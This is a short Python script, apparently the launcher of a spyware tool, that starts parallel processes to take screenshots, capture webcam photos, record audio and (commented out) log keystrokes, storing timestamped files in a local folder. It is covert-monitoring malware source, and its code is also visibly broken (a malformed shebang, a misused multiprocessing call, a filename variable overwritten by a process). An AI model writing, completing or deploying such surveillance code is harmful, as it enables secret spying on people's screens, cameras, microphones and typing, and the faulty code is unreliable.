#!usr/bin/env python
import threading
import datetime
import os
from path import Path
from Screenshot import capture_ss
from CameraCapture import capture_photo
from audio import recording
from KeyStrokes import strokes
import time
import multiprocessing


def file_name():
    currDT = datetime.datetime.now()
    current_time = currDT.strftime("%H:%M:%S").replace(":", "-")
    global screen
    screen= "SS_" + current_time + ".png"
    global camera
    camera= "capture_" + current_time + ".png"
    global audio
    audio= "audio_" + current_time + ".wav"
    global keys
    keys = "strokes" + current_time + ".txt"
    time.sleep(60)


def change_location():
    loc_ss = Path()
    if not os.path.exists(loc_ss):
        os.mkdir(loc_ss)
    os.chdir(loc_ss)


def start():
    global screen
    global camera
    global audio
    global keys
    ss = multiprocessing.Process(capture_ss)
    cam = multiprocessing.Process(capture_photo)
    sound = multiprocessing.Process(recording)
    keys = multiprocessing.Process(strokes)
    ss.start()
    cam.start()
    sound.start()
    #keys.start()


screen = ""
camera = ""
audio = ""
keys = ""
start()
